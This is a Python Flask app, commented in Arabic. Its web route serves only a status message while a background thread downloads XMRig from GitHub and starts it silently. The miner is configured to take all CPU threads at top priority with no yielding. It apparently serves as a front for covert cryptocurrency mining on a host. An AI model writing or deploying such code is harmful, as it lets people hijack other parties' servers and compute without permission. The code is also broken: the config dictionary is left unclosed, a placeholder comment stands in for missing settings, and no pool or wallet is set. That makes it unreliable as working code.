import threading
import time
import os
import subprocess
import urllib.request
import tarfile
import json
import psutil
from flask import Flask

app = Flask(__name__)

# ------------------- XMRig Part -------------------
def run_xmrig():
    home_dir = os.path.expanduser("~")
    xmrig_dir = os.path.join(home_dir, ".xmrig")
    os.makedirs(xmrig_dir, exist_ok=True)

    tar_path = os.path.join(xmrig_dir, "xmrig-static.tar.gz")
    url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"

    if not os.path.exists(os.path.join(xmrig_dir, "xmrig-6.24.0", "xmrig")):
        print("جاري تحميل XMRig...")
        urllib.request.urlretrieve(url, tar_path)
        with tarfile.open(tar_path, "r:gz") as tar:
            def is_within_directory(directory, target):
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                prefix = os.path.commonprefix([abs_directory, abs_target])
                return prefix == abs_directory
            def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                for member in tar.getmembers():
                    member_path = os.path.join(path, member.name)
                    if not is_within_directory(path, member_path):
                        raise Exception("Path Traversal Attempt")
                tar.extractall(path, members, numeric_owner=numeric_owner)
            safe_extract(tar, path=xmrig_dir)
        os.remove(tar_path)

    xmrig_exe = os.path.join(xmrig_dir, "xmrig-6.24.0", "xmrig")
    os.chmod(xmrig_exe, 0o755)

    config = { 
            "autosave": True,
    "background": False,
    "colors": False,
    "donate-level": 0,  # لا تبرع
    "cpu": {
        "enabled": True,
        "huge-pages": True,
        "huge-pages-jit": True,
        "hw-aes": True,
        "priority": 5,  # أعلى أولوية
        "memory-pool": False,
        "yield": False,  # لا تنازل عن CPU
        "max-threads-hint": 100,  # كل الـ threads
        "asm": True,
        "randomx": {
            "init": -1,  # كل الـ cores للـ init
            "mode": "fast",  # أسرع وضع
            "1gb-pages": True,  # قسري لـ 1GB pages
            "numa": True,
            "scratchpad_prefetch_mode": 1  # تحسين prefetch


    }
    # (انسخ نفس الـ config اللي كتبته سابقًا بالكامل)

    config_path = os.path.join(xmrig_dir, "config.json")
    with open(config_path, "w") as f:
        json.dump(config, f, indent=4)

    cmd = [
        xmrig_exe,
        "--config=" + config_path,
        "--cpu-max-threads-hint=100",
        "--randomx-1gb-pages",
        "--no-color"
    ]

    print("بدء التعدين بأقصى طاقة...")
    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ------------------- Flask Part -------------------
@app.route("/")
def home():
    return "سيرفرك شغال + التعدين في الخلفية 100%"

def start_mining():
    thread = threading.Thread(target=run_xmrig, daemon=True)
    thread.start()

if __name__ == "__main__":
    start_mining()        # يشتغل التعدين فورًا
    app.run(host="0.0.0.0", port=8080)

